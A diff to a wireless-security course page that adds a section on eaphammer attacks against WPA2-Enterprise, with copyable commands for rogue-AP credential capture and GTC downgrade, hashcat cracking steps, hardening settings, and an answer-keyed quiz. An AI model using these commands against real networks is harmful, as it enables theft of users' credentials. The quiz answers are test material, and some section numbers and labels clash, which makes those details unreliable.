@@ -149,6 +149,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -508,7 +529,112 @@
       </div>
     </section>
 
-    <!-- Section 7: Countermeasures -->
+    <!-- Section 7: eaphammer + Advanced Attacks -->
+    <section id="eaphammer">
+      <h2><span class="section-num">07</span> eaphammer — Advanced Enterprise Attacks</h2>
+      <p>
+        <code>eaphammer</code> is a modern Python-based WPA-Enterprise attack framework that extends beyond
+        hostapd-wpe with GTC downgrade, PEAP relay, and automated certificate generation.
+      </p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">eaphammer — credential capture + GTC downgrade</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-eaphammer')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-eaphammer"><span class="cmt"># Standard PEAP-MSCHAPv2 credential capture</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo python3 eaphammer <span class="flag">--interface</span> wlan1 <span class="flag">--essid</span> <span class="str">CorpWiFi</span> <span class="flag">--auth</span> peap <span class="flag">--creds</span></span>
+<span class="cmt"># --interface  → AP interface (eaphammer manages monitor/AP mode)</span>
+<span class="cmt"># --essid      → target enterprise SSID (match exactly)</span>
+<span class="cmt"># --auth peap  → EAP method: peap, ttls, eap-fast</span>
+<span class="cmt"># --creds      → enable credential capture and logging</span>
+<span class="out-ok">[+] MSCHAPv2 captured: alice@corp.com | challenge: ... | response: ...</span>
+
+<span class="cmt"># GTC downgrade attack — tricks clients into sending PASSWORD in cleartext</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo python3 eaphammer <span class="flag">--interface</span> wlan1 <span class="flag">--essid</span> <span class="str">CorpWiFi</span> <span class="flag">--auth</span> peap <span class="flag">--negotiate</span> <span class="str">gtc-downgrade</span> <span class="flag">--creds</span></span>
+<span class="cmt"># --negotiate gtc-downgrade → attempt to downgrade inner auth from MSCHAPv2 to GTC</span>
+<span class="cmt"># GTC (Generic Token Card) transmits the password in PLAINTEXT inside the TLS tunnel</span>
+<span class="cmt"># More powerful than MSCHAPv2 capture — no cracking needed, password is direct</span>
+<span class="out-ok">[+] GTC cleartext password captured: alice@corp.com → Summer2024!</span></div>
+      </div>
+
+      <h3>MSCHAPv2 Hash Structure — Why It Cracks So Fast</h3>
+      <p>Understanding the NT hash formula explains the speed gap between WPA2 and MSCHAPv2 cracking:</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">MSCHAPv2 math vs WPA2 math</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-mschapmath')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-mschapmath"><span class="cmt"># WPA2-PSK: computationally expensive key derivation</span>
+<span class="out">PMK = PBKDF2-HMAC-SHA1(password, SSID, 4096 iterations, 256 bits)</span>
+<span class="cmt"># ↑ 4096 SHA1 rounds per candidate → ~1.2M guesses/sec on RTX 4090</span>
+
+<span class="cmt"># MSCHAPv2 / NetNTLMv2: single fast hash</span>
+<span class="out">NT_hash = MD4(UTF16-LE(password))   ← ONE MD4 hash — extremely fast</span>
+<span class="out">Response = DES3(NT_hash, challenge) ← challenge-response using NT hash</span>
+<span class="cmt"># ↑ 1 MD4 per candidate → ~70,000M guesses/sec (NT hash mode 1000)</span>
+<span class="cmt"># ↑ NetNTLMv2 adds HMAC-MD5 → ~3,300M guesses/sec (mode 5600)</span>
+
+<span class="cmt"># hashcat modes for enterprise captures:</span>
+<span class="out">-m 1000  → NT hash (MD4)           — fastest; from asleap output</span>
+<span class="out">-m 5500  → NetNTLMv1 / MSCHAPv1   — EAP-LEAP captures</span>
+<span class="out">-m 5600  → NetNTLMv2 / MSCHAPv2   — hostapd-wpe PEAP captures</span>
+
+<span class="cmt"># Format for hashcat -m 5600:</span>
+<span class="out">username::domain:ServerChallenge:NTProofStr:blob</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">echo <span class="str">'alice::CORP:5d9b4b1f3a2e7c8d:a1b2c3d4e5f6a7b8:0101...'</span> > ntlmv2.hash</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hashcat <span class="flag">-m</span> <span class="str">5600</span> ntlmv2.hash rockyou.txt <span class="flag">-r</span> rules/best64.rule <span class="flag">-O</span></span></div>
+      </div>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>EAP-TTLS/PAP — Even More Dangerous:</strong> When an EAP-TTLS network uses PAP as inner authentication, the password is transmitted in cleartext inside the TLS tunnel. The rogue server receives the literal password string — no cracking needed. Always check the inner auth method in the EAP exchange.</div>
+      </div>
+    </section>
+
+    <!-- Section 8: Windows GP + Anonymous Identity -->
+    <section id="windows-hardening">
+      <h2><span class="section-num">08</span> Windows Hardening &amp; Anonymous Outer Identity</h2>
+
+      <h3>Anonymous Outer Identity Leakage</h3>
+      <p>
+        PEAP uses an <strong>outer identity</strong> (transmitted before TLS) and an <strong>inner identity</strong>
+        (transmitted inside TLS). Many clients send the real username as the outer identity, leaking it to any observer — even before authentication.
+      </p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Outer identity leakage and Windows Group Policy hardening</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-gpolicy')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-gpolicy"><span class="cmt"># Detect outer identity leakage in Wireshark</span>
+<span class="cmt"># Filter: eap → EAP-Identity request/response</span>
+<span class="cmt"># Outer identity appears BEFORE TLS — visible in cleartext</span>
+<span class="out-warn">Frame: EAP Response Identity → alice@corp.com  ← LEAKED before TLS</span>
+
+<span class="cmt"># Best practice: configure anonymous outer identity</span>
+<span class="out"># wpa_supplicant anonymous outer identity:</span>
+<span class="out">anonymous_identity="anonymous@corp.com"   ← outer (visible to attacker)</span>
+<span class="out">identity="alice@corp.com"                 ← inner (protected inside TLS)</span>
+
+<span class="cmt"># Windows Group Policy — enforce RADIUS cert validation</span>
+<span class="cmt"># Path: Computer Config → Policies → Windows Settings → Security Settings</span>
+<span class="cmt">#       → Wireless Network (IEEE 802.11) Policies → PEAP Properties</span>
+<span class="out">✓ Validate server certificate: ENABLED</span>
+<span class="out">✓ Connect to these servers: radius.corp.com</span>
+<span class="out">✓ Trusted root CAs: [select your internal PKI CA]</span>
+<span class="out">✗ Do not prompt user if not authorized: DISABLED</span>
+
+<span class="cmt"># Verify via netsh (Windows):</span>
+<span class="out">netsh wlan show profile name="CorpWiFi" key=clear</span></div>
+      </div>
+    </section>
+
+    <!-- Section 9: Countermeasures -->
     <section id="countermeasures">
       <h2><span class="section-num">07</span> Detection &amp; Countermeasures</h2>
 
@@ -553,6 +679,124 @@
       </div>
     </section>
 
+    <!-- Section 10: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">10</span> Knowledge Check</h2>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 13 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">In WPA2-Enterprise, what is the role of the Access Point (Authenticator)? What does it NOT do that many assume it does?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">The AP validates credentials directly against its own local database</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">The AP is a relay — it forwards EAP messages between the client and RADIUS server over UDP/1812. It does NOT validate credentials itself; all authentication logic lives in the RADIUS backend (FreeRADIUS, Windows NPS, etc.)</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">The AP stores hashed passwords locally and verifies them without RADIUS</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">The AP terminates TLS and decrypts MSCHAPv2 credentials before forwarding to RADIUS</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">Why does PEAP-MSCHAPv2 remain vulnerable to rogue RADIUS attacks even though it uses TLS encryption?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because PEAP uses an outdated TLS version (1.0) that can be decrypted</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">PEAP uses one-way TLS — only the server is authenticated. When clients are misconfigured to not validate the server certificate, they accept any certificate (including self-signed ones from a rogue server) and transmit MSCHAPv2 credentials inside the fake TLS tunnel</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because MSCHAPv2 doesn't fit inside a TLS tunnel and is transmitted outside it</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">Because TLS only protects data in transit — MSCHAPv2 is encrypted but the key is shared</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">What three values does hostapd-wpe capture when a PEAP client authenticates, and which hashcat mode cracks them?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">SSID, BSSID, and PTK — cracked with hashcat -m 22000</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">Username, MSCHAPv2 challenge, and MSCHAPv2 response — cracked with hashcat -m 5600 (NetNTLMv2) or first extracting the NT hash with asleap and cracking with -m 1000</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">ANonce, SNonce, and MIC — cracked with hashcat -m 22000</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">EAP-Identity, TLS session key, and GTK — cracked with -m 5500</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">The NT hash formula is <code>MD4(UTF16-LE(password))</code>. Why does this make MSCHAPv2 crack approximately 58,000 times faster than WPA2-PSK?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">Because MD4 uses a 32-bit key while SHA1 uses 64-bit, giving MD4 a smaller search space</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">WPA2-PSK requires PBKDF2-HMAC-SHA1 with 4096 iterations per candidate (~1.2M H/s). NT hash requires only a single MD4 computation per candidate (~70,000M H/s). MD4 is intentionally fast — the 4096-iteration slowdown in WPA2 is precisely what protects it</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">Because NT hash is 16 bytes vs WPA2's 32-byte PMK, halving the computation time</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">Because MSCHAPv2 uses GPU-native instructions while PBKDF2 is CPU-only</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">What is a GTC downgrade attack in eaphammer, and why is it more powerful than standard MSCHAPv2 capture?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">It downgrades TLS to an older version, allowing the tunnel to be decrypted</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">eaphammer negotiates GTC (Generic Token Card) instead of MSCHAPv2 as the inner EAP method. GTC transmits the password in cleartext inside the TLS tunnel — no cracking needed. The server receives the literal plaintext password directly</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">It downgrades the client from WPA3 to WPA2 to enable PMKID capture</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">It generates a forged server certificate that passes even with cert validation enabled</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">What is the PEAP outer identity and what does it leak to an attacker even with TLS properly configured?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">The outer identity is the TLS certificate CN — it reveals the RADIUS server hostname</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">The outer identity (EAP-Identity response, sent BEFORE TLS establishment) is transmitted in cleartext. If not set to anonymous, it reveals the user's real username (e.g., alice@corp.com) to any passive observer — even without a rogue AP</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">The outer identity is the SSID — it reveals the target corporate network name</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">The outer identity is irrelevant — it's always set to 'anonymous' by default in all clients</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">A WPA3-SAE network is detected in WPA3-Transition mode (WPA2+WPA3). How do you exploit this?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">Use dragonslayer to perform a timing side-channel attack on the SAE commit phase</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">Deploy a WPA2-only evil twin with the same SSID — WPA3-capable clients in transition mode will fall back to WPA2, making them vulnerable to standard PMKID capture or 4-way handshake cracking (Modules 06, 12). Fix: configure the AP as WPA3-only</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">Replay EAPOL M3 frames to perform a KRACK attack on the SAE handshake</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">WPA3-Transition mode is fully protected — WPA3 clients cannot be downgraded</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">Write the two critical wpa_supplicant directives that prevent rogue RADIUS server attacks on a PEAP-MSCHAPv2 network.</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>wpa_key_mgmt=WPA-EAP</code> and <code>eap=PEAP</code></button>
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>proto=RSN</code> and <code>pairwise=CCMP</code></button>
+            <button class="option-btn" onclick="answer(this,'q8',true)"><code>ca_cert="/path/to/corp-radius-ca.pem"</code> (validates server against pinned CA) and <code>subject_match="/CN=radius.corp.com"</code> (pins to specific server hostname) — together these reject any certificate not signed by the internal CA matching the pinned CN</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)"><code>anonymous_identity="anonymous"</code> and <code>phase1="peaplabel=0"</code></button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <div class="nav-footer">
       <a href="../module-12-pmkid-attack/" class="nav-btn prev">&#8592; Module 12: PMKID Attack</a>
       <a href="../module-14-attack-chaining/" class="nav-btn next">Module 14: Attack Chaining &#8594;</a>
@@ -574,6 +818,78 @@
       btn.textContent = 'Copied!'; btn.classList.add('copied');
       setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
     });
+  }
+
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. The AP is purely a relay (NAS — Network Access Server) in WPA2-Enterprise. It converts EAP-over-802.11 frames from the client into RADIUS packets (UDP/1812) to the authentication server. The RADIUS server validates the credential and returns Access-Accept or Access-Reject. The AP just opens or blocks the port based on that response.",
+      wrong: "Incorrect. The AP in WPA2-Enterprise is a relay, not a validator. It forwards EAP frames between client (supplicant) and RADIUS server (authenticator). The RADIUS server — backed by Active Directory, LDAP, or a local DB — does the actual credential validation."
+    },
+    q2: {
+      correct: "Correct. PEAP TLS is one-way (server-only) authentication. The server presents a certificate; the client is supposed to validate it. When clients are misconfigured to skip validation (common in enterprise deployments), any certificate works — including a self-signed one from a rogue server. The MSCHAPv2 credentials flow into the rogue server's fake TLS tunnel.",
+      wrong: "Incorrect. The PEAP vulnerability is client-side certificate validation failure. PEAP only requires the server to present a certificate — not the client. When clients don't validate the server cert, they connect to any rogue server presenting any cert, and transmit MSCHAPv2 credentials inside the fake TLS tunnel."
+    },
+    q3: {
+      correct: "Correct. hostapd-wpe logs: (1) username, (2) MSCHAPv2 challenge (server-sent random bytes), (3) MSCHAPv2 response (client's computed NT-hash-based reply). These are cracked with hashcat -m 5600 (NetNTLMv2). Alternatively, asleap extracts the NT hash from the challenge/response pair, which can then be cracked 58,000× faster with hashcat -m 1000.",
+      wrong: "Incorrect. hostapd-wpe captures: username, challenge (random bytes sent by server), and response (NT-hash-based computation by client). These form an MSCHAPv2/NetNTLMv2 hash pair crackable with hashcat -m 5600. asleap can extract the NT hash for even faster cracking with -m 1000."
+    },
+    q4: {
+      correct: "Correct. NT hash = MD4(UTF16-LE(password)) — a single MD4 computation. MD4 is fast by design (~70 billion/sec on RTX 4090). WPA2-PSK uses PBKDF2-SHA1 with 4096 iterations specifically to be slow (~1.2M/sec). The 4096-iteration PBKDF2 is the WPA2 'work factor' — MD4 has no work factor, making it nearly 58,000× faster.",
+      wrong: "Incorrect. The speed gap comes from PBKDF2's 4096-iteration work factor in WPA2 vs. a single MD4 in MSCHAPv2. WPA2: 4096 SHA1 rounds per candidate = ~1.2M/sec. NT hash: 1 MD4 per candidate = ~70,000M/sec. The difference is 4096 iterations × 14× MD4 advantage ≈ 58,000×."
+    },
+    q5: {
+      correct: "Correct. GTC (Generic Token Card) is an EAP inner method that transmits a static token/password in plaintext inside the TLS tunnel. eaphammer negotiates GTC instead of MSCHAPv2 during the inner EAP exchange. The client sends its password directly as a plaintext GTC token — the rogue server logs the literal password with zero cracking required.",
+      wrong: "Incorrect. GTC (Generic Token Card) is an EAP inner method where the client sends a plaintext password/token inside the TLS tunnel. eaphammer's GTC downgrade negotiates this instead of MSCHAPv2. The rogue server receives the cleartext password directly — far more powerful than a hash that requires cracking."
+    },
+    q6: {
+      correct: "Correct. The EAP-Identity response (outer identity) is sent BEFORE the TLS tunnel is established — it's plaintext over the air. If a client sends their real username (e.g., alice@corp.com) as the outer identity, any passive observer with a monitor-mode adapter can read it. Best practice: set outer identity to 'anonymous@corp.com' and use the real identity only inside TLS.",
+      wrong: "Incorrect. The outer identity is the EAP-Identity response, transmitted in cleartext before TLS negotiation. It's visible to any passive observer. When clients send their real username as the outer identity (the default in many deployments), it leaks organizational usernames without requiring any active attack."
+    },
+    q7: {
+      correct: "Correct. WPA3-Transition mode advertises both WPA2 and WPA3. Clients that support WPA3 prefer it, but they'll fall back to WPA2 if only WPA2 is advertised. A WPA2-only evil twin exploits this: WPA3-capable clients connect via WPA2 → standard PMKID or 4-way handshake attack applies. Fix: configure the AP as WPA3-only, disabling transition mode entirely.",
+      wrong: "Incorrect. WPA3-Transition mode is the vulnerability. Deploy a WPA2-only evil twin with the same SSID. WPA3-capable clients that would normally use SAE will fall back to WPA2-PSK when they see only WPA2 advertised. This exposes them to PMKID capture (Module 12) or 4-way handshake cracking (Module 06)."
+    },
+    q8: {
+      correct: "Correct. ca_cert pins the RADIUS server validation to your internal CA certificate — any certificate NOT signed by this CA is rejected. subject_match further pins to a specific server CN — preventing an attacker from obtaining a legitimate certificate from the same CA for a different hostname. Together they block all rogue RADIUS attacks where the attacker doesn't have access to your internal PKI.",
+      wrong: "Incorrect. The two critical directives are: ca_cert='/path/to/corp-radius-ca.pem' (validates server certificate against your internal CA, rejecting self-signed or external CA certs) and subject_match='/CN=radius.corp.com' (ensures the certificate matches your specific RADIUS server). These are what block hostapd-wpe and eaphammer attacks."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 14!' : pct >= 0.75 ? 'Strong — review missed questions.' : pct >= 0.5 ? 'Getting there — re-read the PEAP vulnerability and cracking speed sections.' : 'Re-read the EAP architecture, MSCHAPv2 math, and cert validation sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
   }
 
   let simRunning = false;
